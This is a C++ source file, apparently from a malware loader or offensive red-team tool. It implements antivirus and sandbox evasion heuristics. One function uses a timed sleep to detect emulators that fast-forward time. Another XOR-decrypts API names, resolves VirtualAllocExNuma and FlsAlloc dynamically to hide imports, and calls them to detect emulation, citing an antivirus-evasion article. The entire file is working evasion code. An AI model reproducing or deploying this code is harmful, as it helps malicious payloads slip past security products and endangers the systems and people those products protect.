#include "pch.h"
#include <Windows.h>
#include <chrono>
#include <thread>
#include "Heuristics.h"
#include "Globals.h"
#include "Decryptors.h"

//APIs
//// GetCurrentProcess
HANDLE(WINAPI* pGetCurrentProcess)();
//// FlsAlloc
DWORD(WINAPI* pFlsAlloc)(PFLS_CALLBACK_FUNCTION lpCallback);
//// VirtualAllocExNuma
LPVOID(WINAPI* pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
//// CreateProcessA
LPVOID(WINAPI* pCreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);


// chill for 5 seconds, if no chill AV is watching
bool heuristic::Heuristic::CheckSleep(void)
{
    auto t1 = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
    auto t2 = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration<double>(t2 - t1).count();

    if (duration < 1.5)
    {
        return true;
    }
    else
    {
        return false;
    }
}

// try to run non-emulated apis 
bool heuristic::Heuristic::NoEmulate(void)
{
    decryptor::Decryptor::XORDecrypt((char*)GCP, sizeof(GCP), XORKey, sizeof(XORKey));
    pGetCurrentProcess = (HANDLE(WINAPI*)())GetProcAddress(GetModuleHandle(L"kernel32.dll"), GCP);
    HANDLE ps = pGetCurrentProcess();

    // try to run virtualallocexnuma
    decryptor::Decryptor::XORDecrypt((char*)VAEN, sizeof(VAEN), XORKey, sizeof(XORKey));
    pVirtualAllocExNuma = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), VAEN);
    LPVOID pMemory = pVirtualAllocExNuma(ps, NULL, 0x1000, 0x3000, 0x4, 0);                              
    
    // try to allocate fiber local storage (non-emu api)  https://redfoxsecurity.medium.com/antivirus-evasion-26a30f072f76
    decryptor::Decryptor::XORDecrypt((char*)FA, sizeof(FA), XORKey, sizeof(XORKey));
    pFlsAlloc = (DWORD(WINAPI*)(PFLS_CALLBACK_FUNCTION))GetProcAddress(GetModuleHandle(L"kernel32.dll"), FA);
    DWORD checkPtr = FlsAlloc(NULL);                    
    if (pMemory == NULL || checkPtr == NULL)
    {
        return true;
    }
    else
    {
        return false;
    }
}